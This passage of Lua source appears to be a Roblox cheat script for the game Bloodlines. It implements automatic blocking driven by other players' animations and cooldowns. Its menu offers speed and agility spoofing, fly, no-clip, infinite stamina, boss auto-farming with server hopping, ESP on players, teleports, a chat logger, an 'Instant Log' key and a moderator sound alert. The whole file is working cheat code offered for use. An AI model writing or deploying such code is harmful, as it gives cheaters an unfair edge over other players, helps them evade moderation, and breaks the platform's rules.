		if skill.Type == "ANIM" then
			table.insert(animSkills, skill)
			if skill.Dist > maxAnimDist then
				maxAnimDist = skill.Dist
			end
			local num = tonumber(skill.Detect)
			if num then
				animSkillByNum[num] = skill
			end
		elseif skill.Type == "OBJECT" then
			table.insert(objSkills, skill)
			objSkillByKey[(skill.ObjectLocation or "Workspace") .. "/" .. skill.ObjectName] = skill
		end
	end

	local autoBlockConn
	local blocking = false
	local lastBlockTime = {}
	local DETECT_INTERVAL = 0.1
	local detectTimer = 0

	local function startBlock()
		pcall(function()
			dataFunction:InvokeServer("Block")
		end)
	end

	local function endBlock()
		pcall(function()
			dataFunction:InvokeServer("EndBlock")
		end)
	end

	local function doBlock(skill)
		if blocking then
			return
		end

		local now = tick()
		if lastBlockTime[skill] and now - lastBlockTime[skill] < 0.5 then
			return
		end
		lastBlockTime[skill] = now

		blocking = true
		task.spawn(function()
			if skill.Delay > 0 then
				task.wait(skill.Delay)
			end

			if flag("Auto Block") and dataFunction then
				startBlock()
			end

			task.wait(skill.Dur)

			if dataFunction then
				endBlock()
			end

			blocking = false
		end)
	end

	local function getAnimIdNumber(id)
		if not id then
			return nil
		end
		local num = tostring(id):match("(%d+)")
		return num and tonumber(num) or nil
	end

	local function getRangeCap()
		return flag("Block Range") or 50
	end

	local function onSkillCooldown(skill, player)
		if not flag("Auto Block") or blocking then
			return
		end

		local character = player and player.Character
		local root = character and (character:FindFirstChild("HumanoidRootPart") or character.PrimaryPart)
		local myRoot = localPlayerData.rootPart
		if root and myRoot and (myRoot.Position - root.Position).Magnitude <= math.min(skill.Dist, getRangeCap()) then
			doBlock(skill)
		end
	end

	local skillCooldownWatchReady = false
	local function setupSkillCooldownWatch()
		if skillCooldownWatchReady then
			return
		end
		skillCooldownWatchReady = true

		local cooldowns = ReplicatedStorage:FindFirstChild("Cooldowns")
		if not cooldowns then
			return
		end

		local function bindCooldown(value, player)
			if value:IsA("NumberValue") and skillByName[value.Name] then
				value.Changed:Connect(function()
					onSkillCooldown(skillByName[value.Name], player)
				end)
			end
		end

		local function watchFolder(folder, player)
			for _, v in ipairs(folder:GetChildren()) do
				bindCooldown(v, player)
			end
			folder.ChildAdded:Connect(function(v)
				bindCooldown(v, player)
			end)
		end

		for _, p in ipairs(Players:GetPlayers()) do
			local folder = cooldowns:FindFirstChild(p.Name)
			if folder then
				watchFolder(folder, p)
			end
		end

		cooldowns.ChildAdded:Connect(function(folder)
			local p = Players:FindFirstChild(folder.Name)
			if p then
				watchFolder(folder, p)
			end
		end)
	end

	local enemyCache = {}
	local enemyCacheTimer = 0

	local function refreshEnemies()
		enemyCache = {}

		for _, p in ipairs(Players:GetPlayers()) do
			if p ~= localPlayer then
				local char = p.Character
				local hum = char and char:FindFirstChildOfClass("Humanoid")
				local root = char and (char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart)
				if hum and hum.Health > 0 and root then
					table.insert(enemyCache, { model = char, humanoid = hum, rootPart = root })
				end
			end
		end

		for _, model in ipairs(workspace:GetChildren()) do
			if model:IsA("Model") and model ~= localPlayer.Character then
				local hum = model:FindFirstChildOfClass("Humanoid")
				local root = model.PrimaryPart or model:FindFirstChild("HumanoidRootPart")
				if hum and hum.Health > 0 and root then
					table.insert(enemyCache, { model = model, humanoid = hum, rootPart = root })
				end
			end
		end
	end

	local function detectAnimations()
		local rootPart = localPlayerData.rootPart
		if not rootPart then
			return
		end

		local now = tick()
		local rangeCap = getRangeCap()
		local maxDist = math.min(maxAnimDist, rangeCap)

		for _, e in ipairs(enemyCache) do
			if (rootPart.Position - e.rootPart.Position).Magnitude > maxDist then
				continue
			end

			local animator = e.humanoid:FindFirstChildOfClass("Animator")
			if not animator then
				continue
			end

			for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
				local anim = track.Animation
				if not anim then
					continue
				end

				local num = getAnimIdNumber(anim.AnimationId)
				local skill = num and animSkillByNum[num]
				if not skill then
					continue
				end

				if lastBlockTime[skill] and now - lastBlockTime[skill] < 0.5 then
					continue
				end

				if (rootPart.Position - e.rootPart.Position).Magnitude > math.min(skill.Dist, rangeCap) then
					continue
				end

				doBlock(skill)
				if blocking then
					return
				end
			end
		end
	end

	local function detectObjects()
		local rootPart = localPlayerData.rootPart
		if not rootPart then
			return
		end

		local now = tick()
		local rangeCap = getRangeCap()

		local function checkContainer(container, location)
			if not container then
				return
			end

			for _, obj in ipairs(container:GetChildren()) do
				local skill = objSkillByKey[location .. "/" .. obj.Name]
				if not skill then
					continue
				end

				if lastBlockTime[skill] and now - lastBlockTime[skill] < 0.5 then
					continue
				end

				local pos = obj:IsA("BasePart") and obj.Position
					or (obj.PrimaryPart and obj.PrimaryPart.Position)
					or (obj:FindFirstChild("HumanoidRootPart") and obj.HumanoidRootPart.Position)
				if pos and (rootPart.Position - pos).Magnitude <= math.min(skill.Dist, rangeCap) then
					doBlock(skill)
					if blocking then
						return
					end
				end
			end
		end

		checkContainer(workspace:FindFirstChild("Debris"), "Debris")
		checkContainer(workspace, "Workspace")
	end

	setupSkillCooldownWatch()

	function funcs.autoBlock(state)
		if not state then
			if autoBlockConn then
				autoBlockConn:Disconnect()
				autoBlockConn = nil
			end
			blocking = false
			enemyCache = {}
			return
		end

		if autoBlockConn then
			return
		end

		ToastNotif({ text = "Auto Block enabled!" })

		autoBlockConn = RunService.Heartbeat:Connect(function()
			if not flag("Auto Block") then
				return
			end

			local now = tick()
			if now - enemyCacheTimer > 0.5 then
				enemyCacheTimer = now
				refreshEnemies()
			end

			if blocking then
				return
			end

			if now - detectTimer < DETECT_INTERVAL then
				return
			end
			detectTimer = now

			detectAnimations()
			detectObjects()
		end)
	end

	funcs.getAutoBlockSkillNames = function()
		local names = {}
		for _, skill in ipairs(AUTO_BLOCK_SKILLS) do
			table.insert(names, skill.Name)
		end
		return names
	end

	funcs.getAutoBlockSkill = function(name)
		return skillByName[name]
	end

	funcs.updateAutoBlockSkill = function(name, field, value)
		local skill = skillByName[name]
		if skill then
			skill[field] = value
		end
	end

	funcs.resetAutoBlockSkill = function(name)
		local skill = skillByName[name]
		local defaults = defaultSkills[name]
		if skill and defaults then
			skill.Dist = defaults.Dist
			skill.Delay = defaults.Delay
			skill.Dur = defaults.Dur
			skill.Detect = defaults.Detect
			return true
		end
		return false
	end
end

local Window = Library:CreateWindow({
	Title = "Regardments | Bloodlines",
	Center = true,
	AutoShow = true,
	TabPadding = 8,
})

local Main = Window:AddTab("Main")
local AutoFarmTab = Window:AddTab("Auto Farm")
local CombatTab = Window:AddTab("Combat")
local QoL = Window:AddTab("Quality Of Life")
local ESPTab = Window:AddTab("ESP")
local Visuals = Window:AddTab("Visuals")
local InfoTab = Window:AddTab("Information")
local UISettings = Window:AddTab("UI Settings")

-- ── MAIN ──────────────────────────────────────────────
local movement = Main:AddLeftGroupbox("Movement")
local localCheats = Main:AddRightGroupbox("Local Cheats")

movement:AddToggle("Walk Speed", { Text = "Walk Speed", Callback = funcs.speed })
local walkSpeedDepbox = movement:AddDependencyBox()
walkSpeedDepbox:AddSlider("Walk Speed Value", {
	Text = "Walk Speed Value",
	Min = 0,
	Max = 109,
	Default = 50,
	Rounding = 0,
})
walkSpeedDepbox:SetupDependencies({ { Toggles["Walk Speed"], true } })

local flyToggle = movement:AddToggle("Fly", { Text = "Fly", Callback = funcs.flyHack })
flyToggle:AddKeyPicker("Fly Key", { Text = "Fly Keybind", Default = "None", Mode = "Toggle", SyncToggleState = true })
local flySpeedDepbox = movement:AddDependencyBox()
flySpeedDepbox:AddSlider("Fly Speed", {
	Text = "Fly Speed",
	Min = 0,
	Max = 500,
	Default = 50,
	Rounding = 0,
})
flySpeedDepbox:SetupDependencies({ { Toggles["Fly"], true } })

movement:AddToggle("Agility Spoofer", { Text = "Agility Spoofer", Callback = funcs.agilitySpoof })
local agilityDepbox = movement:AddDependencyBox()
agilityDepbox:AddSlider("Agility Spoofer Percent", {
	Text = "Agility Spoofer Percent",
	Min = 5,
	Max = 500,
	Default = 15,
	Rounding = 0,
})
agilityDepbox:SetupDependencies({ { Toggles["Agility Spoofer"], true } })

movement:AddToggle("Infinite Stamina", { Text = "Infinite Stamina", Callback = funcs.infiniteStamina })

local noClipToggle = movement:AddToggle("No Clip", { Text = "No Clip", Callback = funcs.noClip })
noClipToggle:AddKeyPicker("NoClip Key", {
	Text = "NoClip Keybind",
	Default = "None",
	Mode = "Toggle",
	SyncToggleState = true,
})

movement:AddToggle("No Fall Damage", { Text = "No Fall Damage" })
movement:AddToggle("No Kill Bricks", { Text = "No Kill Bricks", Callback = funcs.noKillBricks })

localCheats:AddToggle("Moderator Sound Alert", { Text = "Moderator Sound Alert" })
localCheats:AddToggle("Chakra Sense Notifier", { Text = "Chakra Sense Notifier", Default = true })

localCheats:AddToggle("Chat Logger", { Text = "Chat Logger", Callback = funcs.chatLogger })
localCheats:AddToggle("Chat Logger Auto Scroll", { Text = "Chat Logger Auto Scroll", Default = true })

localCheats:AddButton({ Text = "Reset Character", Func = funcs.resetCharacter })
localCheats:AddButton({ Text = "Remove ForceField", Func = funcs.removeFF })

localCheats:AddLabel("Instant Log"):AddKeyPicker("Instant Log", {
	Text = "Instant Log",
	Default = "F7",
	Mode = "Toggle",
	NoUI = true,
})

localCheats:AddLabel("Attach To Back"):AddKeyPicker("Attach To Back", {
	Text = "Attach To Back",
	Default = "F6",
	Mode = "Hold",
	NoUI = true,
})

-- ── CHAKRA SENSE (MAIN) ───────────────────────────────
local chakraSense = Main:AddRightGroupbox("Chakra Sense")

chakraSense:AddToggle("Chakra Sense Spoof", { Text = "Chakra Sense", Callback = funcs.chakraSpoof })
chakraSense:AddToggle("Sense Detector", { Text = "Sense Detector", Callback = funcs.chakraSenseDetect })

-- ── AUTO FARM ─────────────────────────────────────────
local farmSetup = AutoFarmTab:AddLeftGroupbox("Farm Setup")
local farmToggles = AutoFarmTab:AddLeftGroupbox("Farm Toggles")
local farmActions = AutoFarmTab:AddRightGroupbox("Actions")

farmSetup:AddDropdown("Farm Bosses", {
	Text = "Farm Bosses",
	Values = {
		"Hyuga Boss",
		"Haku Boss",
		"Tairock",
		"Chakra Knight",
		"The Ringed Samurai",
		"Lavarossa",
		"Barbarit The Rose",
		"Lava Snake",
		"Enchanted Tairock",
		"Frosted The Rose",
		"Hallowed Chakra Knight",
	},
	Multi = true,
	Default = {},
})

farmSetup:AddInput("Farm Weapon", {
	Text = "Weapon Name",
	Default = "",
	Finished = true,
	Callback = function(value)
		if value and value ~= "" then
			ToastNotif({ text = "Weapon set: " .. value })
		end
	end,
})

farmToggles:AddToggle("Auto Farm", { Text = "Auto Farm", Callback = funcs.autoFarmBoss })
farmToggles:AddToggle("Auto Pickup", { Text = "Auto Pickup", Callback = funcs.autoPickup })
farmToggles:AddToggle("Farm Server Hop", { Text = "Server Hop on Empty", Default = true })

farmActions:AddButton({ Text = "Set Safe Spot", Func = funcs.setSafeSpot })
farmActions:AddButton({ Text = "Manual Server Hop", Func = funcs.autoFarmServerHop })

-- ── COMBAT ────────────────────────────────────────────
local combatGroup = CombatTab:AddLeftGroupbox("Auto Block")
local blockSettingsGroup = CombatTab:AddLeftGroupbox("Block Settings")
local skillEditorGroup = CombatTab:AddRightGroupbox("Skill Editor")

combatGroup:AddToggle("Auto Block", { Text = "Auto Block", Callback = funcs.autoBlock })
blockSettingsGroup:AddSlider("Block Range", {
	Text = "Block Range",
	Min = 1,
	Max = 150,
	Default = 50,
	Rounding = 0,
})

local selectedEditSkill = nil

local editSkillInfo = skillEditorGroup:AddLabel("Select a skill to edit", true)

local editSkillDropdown = skillEditorGroup:AddDropdown(nil, {
	Text = "Edit Skill",
	Values = funcs.getAutoBlockSkillNames() or {},
	AllowNull = true,
	Callback = function(value)
		selectedEditSkill = value

		if not value then
			editSkillInfo:SetText("Select a skill to edit")
			return
		end

		local skill = funcs.getAutoBlockSkill(value)
		if not skill then
			editSkillInfo:SetText(value)
			return
		end

		local info = "Type: " .. skill.Type
		if skill.Type == "OBJECT" then
			info = info .. " | " .. tostring(skill.ObjectName) .. " (" .. tostring(skill.ObjectLocation) .. ")"
		elseif skill.Type == "ANIM" then
			info = info .. " | ID: " .. tostring(skill.Detect)
		end

		editSkillInfo:SetText(value .. "  [" .. info .. "]")

		editDistSlider:SetValue(skill.Dist or 50)
		editDelaySlider:SetValue(skill.Delay or 0)
		editDurSlider:SetValue(skill.Dur or 0.25)
	end,
})

local editDistSlider = skillEditorGroup:AddSlider(nil, {
	Text = "Dist",
	Min = 1,
	Max = 150,
	Default = 50,
	Rounding = 0,
})

local editDelaySlider = skillEditorGroup:AddSlider(nil, {
	Text = "Delay",
	Min = 0,
	Max = 5,
	Default = 0,
	Rounding = 2,
})

local editDurSlider = skillEditorGroup:AddSlider(nil, {
	Text = "Dur",
	Min = 0,
	Max = 5,
	Default = 0.25,
	Rounding = 2,
})

skillEditorGroup:AddButton({
	Text = "Apply Changes",
	Func = function()
		if not selectedEditSkill then
			ToastNotif({ text = "Select a skill first" })
			return
		end

		funcs.updateAutoBlockSkill(selectedEditSkill, "Dist", editDistSlider.Value)
		funcs.updateAutoBlockSkill(selectedEditSkill, "Delay", editDelaySlider.Value)
		funcs.updateAutoBlockSkill(selectedEditSkill, "Dur", editDurSlider.Value)

		ToastNotif({ text = "Updated " .. selectedEditSkill })
	end,
})

skillEditorGroup:AddButton({
	Text = "Reset to Default",
	Func = function()
		if not selectedEditSkill then
			ToastNotif({ text = "Select a skill first" })
			return
		end

		funcs.resetAutoBlockSkill(selectedEditSkill)

		local skill = funcs.getAutoBlockSkill(selectedEditSkill)
		if skill then
			editDistSlider:SetValue(skill.Dist or 50)
			editDelaySlider:SetValue(skill.Delay or 0)
			editDurSlider:SetValue(skill.Dur or 0.25)
		end

		ToastNotif({ text = "Reset " .. selectedEditSkill })
	end,
})

-- ── ESP ───────────────────────────────────────────────
local playersSection = ESPTab:AddLeftGroupbox("Players")
local mobsSection = ESPTab:AddLeftGroupbox("Mobs")
local npcsSection = ESPTab:AddRightGroupbox("NPCs")
local areasSection = ESPTab:AddRightGroupbox("Areas")

local function makeFor(section, categoryName, espObject)
	section:AddToggle(categoryName, { Text = "Enable" })
	section:AddToggle(categoryName .. " Show Distance", { Text = "Show Distance" })
	section:AddToggle(categoryName .. " Show Health", { Text = "Show Health" })
	section:AddSlider(categoryName .. " Max Distance", {
		Text = "Max Distance",
		Min = 100,
		Max = 100000,
		Default = 100000,
		Rounding = 0,
	})
end

makeFor(playersSection, "Players", playersESP)
makeFor(mobsSection, "Mobs", mobsESP)
makeFor(npcsSection, "Npcs", npcsESP)
makeFor(areasSection, "Areas", areasESP)

-- ── QUALITY OF LIFE ───────────────────────────────────
local characterQoL = QoL:AddLeftGroupbox("Character")
local teleportQoL = QoL:AddLeftGroupbox("Teleports")
local accountQoL = QoL:AddRightGroupbox("Account")
local dataQoL = QoL:AddRightGroupbox("Data")

characterQoL:AddButton({ Text = "Open Wipe Shop", Func = funcs.openWipeShop })
characterQoL:AddButton({ Text = "Unlock Burrow", Func = funcs.unlockBurrow })

accountQoL:AddDropdown("Reincarnation Gender", {
	Text = "Gender",
	Values = { "Male", "Female" },
	Default = 1,
})
accountQoL:AddButton({ Text = "Wipe", Func = funcs.wipe })

local chakraDropdown = teleportQoL:AddDropdown("Chakra Point", {
	Text = "Chakra Point",
	Values = chakraPoints,
	AllowNull = true,
})
teleportQoL:AddButton({ Text = "Teleport To", Func = funcs.teleportToChakraPoint })

npcDropdown = teleportQoL:AddDropdown("NPC Teleport", {
	Text = "NPCs",
	Values = npcs,
	AllowNull = true,
})
teleportQoL:AddButton({ Text = "Teleport To", Func = funcs.teleportToNPC })
teleportQoL:AddButton({ Text = "Refresh NPC List", Func = funcs.refreshNPCList })

teleportQoL:AddDropdown("Player Teleport", {
	Text = "Players",
	SpecialType = "Player",
	AllowNull = true,
})
teleportQoL:AddButton({ Text = "Teleport To", Func = funcs.teleportToPlayer })

teleportQoL:AddToggle("Thunderstorm Server Finder", {
	Text = "Thunderstorm Server Finder",
	Callback = funcs.findThunderstormServer,
})

dataQoL:AddButton({ Text = "Purchase Item", Func = funcs.giveItem })
dataQoL:AddDropdown("Item Name", {
	Text = "Item Name",
	Values = purchasableItems,
	AllowNull = true,
})

-- ── VISUALS ───────────────────────────────────────────
local lighting = Visuals:AddLeftGroupbox("Lighting")

lighting:AddToggle("No Fog", { Text = "No Fog", Callback = funcs.noFog })
lighting:AddToggle("No Rain", { Text = "No Rain", Callback = funcs.noRain })

lighting:AddToggle("Full Bright", { Text = "Full Bright", Callback = funcs.fullBright })
lighting:AddSlider("Brightness Level", {
	Text = "Brightness Level",
	Min = 1,
	Max = 10,
	Default = 2,
	Rounding = 1,
})

lighting:AddDropdown("Time Of Day", {
	Text = "Time Of Day",
	Values = { "Morning", "Afternoon", "Evening", "Night" },
	Default = "Morning",
})

lighting:AddToggle("Time Changer", { Text = "Time Changer", Callback = funcs.timeChanger })

-- ── INFORMATION ───────────────────────────────────────
local combatInfo = InfoTab:AddLeftGroupbox("Combat")
local usageInfo = InfoTab:AddRightGroupbox("Usages")

combatInfo:AddButton({ Text = "Refresh", Func = funcs.refreshInfo })

local function addInfoLabel(box, key, title)
	local label = box:AddLabel(title .. ": --")
	infoLabels[key] = { title = title, label = label }
	return label
end

addInfoLabel(combatInfo, "M1s", "M1s")
addInfoLabel(combatInfo, "Knocks", "Knocks")
addInfoLabel(combatInfo, "Grips", "Grips")
addInfoLabel(combatInfo, "Blocks", "Blocks")
addInfoLabel(combatInfo, "WarPoints", "War Points")
addInfoLabel(combatInfo, "CP", "CP")

addInfoLabel(usageInfo, "ByakuganUsage", "Byakugan")
addInfoLabel(usageInfo, "SharinganUsage", "Sharingan")
addInfoLabel(usageInfo, "MangekyoUsage", "Mangekyo")
addInfoLabel(usageInfo, "JinchurikiUsage", "Jinchuriki")
addInfoLabel(usageInfo, "KetsuryuganUsage", "Ketsuryugan")
addInfoLabel(usageInfo, "BlueGatesUsage", "Blue Gates")
addInfoLabel(usageInfo, "GreenGatesUsage", "Green Gates")
addInfoLabel(usageInfo, "RedGatesUsage", "Red Gates")

-- ── UI SETTINGS ───────────────────────────────────────
local menuGroup = UISettings:AddLeftGroupbox("Menu")

menuGroup:AddLabel("Menu keybind"):AddKeyPicker("MenuKeybind", {
	Default = "RightShift",
	NoUI = true,
	Text = "Menu keybind",
})

Library.ToggleKeybind = Options.MenuKeybind

menuGroup:AddButton("Unload", function()
	Library:Unload()
end)

ThemeManager:SetLibrary(Library)
ThemeManager:SetFolder("bloodlines-rewrite-configs")
ThemeManager:ApplyToTab(UISettings)

SaveManager:SetLibrary(Library)
SaveManager:SetFolder("bloodlines-rewrite-configs")
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({ "MenuKeybind" })
SaveManager:BuildConfigSection(UISettings)

if #chakraPoints == 0 then
	task.spawn(function()
		while #chakraPoints == 0 do
			if populateChakraPoints() then
				break
			end

			task.wait(1)
		end

		chakraDropdown:SetValues(chakraPoints)

		if chakraPoints[1] then
			chakraDropdown:SetValue(chakraPoints[1])
		end
	end)
end

local scriptConnections = {}

local function trackKeybind(idx, onPress, onRelease)
	local option = Options[idx]
	if not option then
		return
	end

	local wasDown = false

	local conn = RunService.RenderStepped:Connect(function()
		local state = option:GetState()

		if state and not wasDown then
			if onPress then
				onPress()
			end
		elseif not state and wasDown then
			if onRelease then
				onRelease()
			end
		end

		wasDown = state
	end)

	table.insert(scriptConnections, conn)
	return conn
end

trackKeybind("Instant Log", funcs.instantLog)

local attachConn
trackKeybind("Attach To Back", function()
	if attachConn then
		return
	end

	attachConn = RunService.RenderStepped:Connect(function()
		funcs.attachToBack()
	end)
end, function()
	if attachConn then
		attachConn:Disconnect()
		attachConn = nil
	end
end)

local espUpdateConn = RunService.RenderStepped:Connect(function()
	mobsESP:UpdateAll()
	npcsESP:UpdateAll()
	areasESP:UpdateAll()
	playersESP:UpdateAll()
end)
table.insert(scriptConnections, espUpdateConn)

Library:OnUnload(function()
	funcs.flyHack(false)
	funcs.speed(false)
	funcs.noClip(false)
	funcs.timeChanger(false)
	funcs.autoPickup(false)
	funcs.chatLogger(false)
	funcs.chakraSpoof(false)
	funcs.chakraSenseDetect(false)
	funcs.agilitySpoof(false)
	funcs.infiniteStamina(false)
	funcs.autoFarmBoss(false)
	funcs.autoBlock(false)

	if funcs.lbClickConn then
		funcs.lbClickConn:Disconnect()
		funcs.lbClickConn = nil
	end

	if attachConn then
		attachConn:Disconnect()
		attachConn = nil
	end

	for _, conn in ipairs(scriptConnections) do
		pcall(function()
			conn:Disconnect()
		end)
	end

	mobsESP:UnloadAll()
	npcsESP:UnloadAll()
	areasESP:UnloadAll()
	playersESP:UnloadAll()

	local humanoid = localPlayerData.humanoid
	if humanoid then
		humanoid.WalkSpeed = 16
	end

	getgenv().AztupLycorisLoaded = nil
end)

SaveManager:LoadAutoloadConfig()
